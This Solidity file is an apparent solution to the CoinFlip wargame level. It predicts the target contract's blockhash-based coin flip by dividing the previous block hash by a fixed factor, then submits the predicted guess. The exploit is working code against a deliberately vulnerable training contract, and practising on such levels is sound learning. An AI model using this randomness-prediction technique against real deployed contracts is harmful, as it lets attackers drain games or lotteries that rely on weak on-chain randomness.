// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {CoinFlip} from "../levels/CoinFlip.sol";

contract CoinflipAttack {
    CoinFlip private immutable coinFlip;
    uint256 immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip){
        coinFlip = _coinFlip;
    }
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        coinFlip.flip(blockValue / FACTOR == 1);
    }
}
